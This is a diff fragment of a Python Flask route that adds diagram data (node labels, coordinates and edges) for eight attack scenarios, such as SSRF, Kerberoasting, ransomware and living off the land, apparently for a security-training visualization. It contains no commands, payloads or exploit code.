+        {'id':'inject','label':'DLL Injection','type':'malicious','x':250,'y':300},
+        {'id':'system','label':'SYSTEM Shell','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'payload'},{'from':'payload','to':'inject'},{'from':'inject','to':'process'},
+                  {'from':'process','to':'system'}]}
+    # Scenario 23: SSRF
+    maps[23] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
+        {'id':'meta','label':'AWS Metadata','type':'cloud','x':450,'y':100},
+        {'id':'internal','label':'Internal Service','type':'server','x':450,'y':300},
+        {'id':'s3','label':'S3 Bucket','type':'database','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'webapp'},{'from':'webapp','to':'meta'},{'from':'webapp','to':'internal'},
+                  {'from':'meta','to':'s3'}]}
+    # Scenario 24: Ransomware
+    maps[24] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'rdp','label':'RDP Server','type':'server','x':230,'y':200},
+        {'id':'exfil','label':'Exfil Server','type':'malicious','x':230,'y':350},
+        {'id':'share1','label':'File Share 1','type':'server','x':450,'y':100},
+        {'id':'share2','label':'File Share 2','type':'server','x':450,'y':300},
+        {'id':'ransomware','label':'Ransom Note','type':'malicious','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'rdp'},{'from':'rdp','to':'share1'},{'from':'rdp','to':'share2'},
+                  {'from':'share1','to':'exfil'},{'from':'share2','to':'ransomware'}]}
+    # Scenario 25: Kerberoasting
+    maps[25] = {'nodes': [
+        {'id':'attacker','label':'Low-Priv User','type':'attacker','x':50,'y':200},
+        {'id':'ad','label':'Active Directory','type':'server','x':250,'y':100},
+        {'id':'spn','label':'SPN Accounts','type':'database','x':250,'y':300},
+        {'id':'tgs','label':'TGS Tickets','type':'malicious','x':450,'y':200},
+        {'id':'dc','label':'Domain Controller','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'ad'},{'from':'ad','to':'spn'},{'from':'spn','to':'tgs'},
+                  {'from':'tgs','to':'dc'}]}
+    # Scenario 26: Device Cloning
+    maps[26] = {'nodes': [
+        {'id':'attacker','label':'Forensic Station','type':'attacker','x':50,'y':200},
+        {'id':'device','label':'Target Device','type':'workstation','x':250,'y':200},
+        {'id':'clone','label':'Disk Image','type':'database','x':450,'y':100},
+        {'id':'creds','label':'Credentials','type':'malicious','x':450,'y':300},
+        {'id':'recovered','label':'Recovered Files','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'device'},{'from':'device','to':'clone'},{'from':'clone','to':'creds'},
+                  {'from':'clone','to':'recovered'}]}
+    # Scenario 27: Watering Hole
+    maps[27] = {'nodes': [
+        {'id':'attacker','label':'APT Group','type':'attacker','x':50,'y':200},
+        {'id':'website','label':'Industry News','type':'server','x':250,'y':200},
+        {'id':'exploit','label':'Exploit Kit','type':'malicious','x':250,'y':350},
+        {'id':'v1','label':'Target Emp 1','type':'workstation','x':450,'y':100},
+        {'id':'v2','label':'Target Emp 2','type':'workstation','x':450,'y':300},
+        {'id':'c2','label':'C2 Server','type':'malicious','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'website'},{'from':'website','to':'exploit'},{'from':'exploit','to':'v1'},
+                  {'from':'exploit','to':'v2'},{'from':'v1','to':'c2'},{'from':'v2','to':'c2'}]}
+    # Scenario 28: Insider Attack
+    maps[28] = {'nodes': [
+        {'id':'insider','label':'Insider','type':'attacker','x':50,'y':200},
+        {'id':'db','label':'Customer DB','type':'database','x':250,'y':200},
+        {'id':'stego','label':'Steganography','type':'malicious','x':450,'y':120},
+        {'id':'email','label':'Personal Email','type':'server','x':450,'y':300},
+        {'id':'darkweb','label':'Dark Web','type':'malicious','x':650,'y':200}],
+        'edges': [{'from':'insider','to':'db'},{'from':'db','to':'stego'},{'from':'stego','to':'email'},
+                  {'from':'email','to':'darkweb'}]}
+    # Scenario 29: Zero-Day
+    maps[29] = {'nodes': [
+        {'id':'attacker','label':'Researcher','type':'attacker','x':50,'y':200},
+        {'id':'fuzz','label':'AFL Fuzzer','type':'malicious','x':220,'y':100},
+        {'id':'target','label':'Target App','type':'server','x':400,'y':100},
+        {'id':'exploit','label':'ROP Exploit','type':'malicious','x':220,'y':300},
+        {'id':'payload','label':'Payload','type':'malicious','x':400,'y':300},
+        {'id':'shell','label':'Root Shell','type':'server','x':600,'y':200}],
+        'edges': [{'from':'attacker','to':'fuzz'},{'from':'fuzz','to':'target'},{'from':'target','to':'exploit'},
+                  {'from':'exploit','to':'payload'},{'from':'payload','to':'shell'}]}
+    # Scenario 30: Living Off the Land
+    maps[30] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'certutil','label':'certutil.exe','type':'server','x':220,'y':100},
+        {'id':'wmic','label':'WMIC','type':'server','x':220,'y':300},
+        {'id':'schtasks','label':'schtasks','type':'malicious','x':420,'y':100},
+        {'id':'psexec','label':'PsExec','type':'malicious','x':420,'y':300},
+        {'id':'dns','label':'DNS Exfil','type':'cloud','x':620,'y':200}],
+        'edges': [{'from':'attacker','to':'certutil'},{'from':'attacker','to':'wmic'},{'from':'certutil','to':'schtasks'},
+                  {'from':'wmic','to':'psexec'},{'from':'psexec','to':'dns'},{'from':'schtasks','to':'dns'}]}
     return jsonify(maps.get(scenario_id, maps[1]))
 
 if __name__ == '__main__':
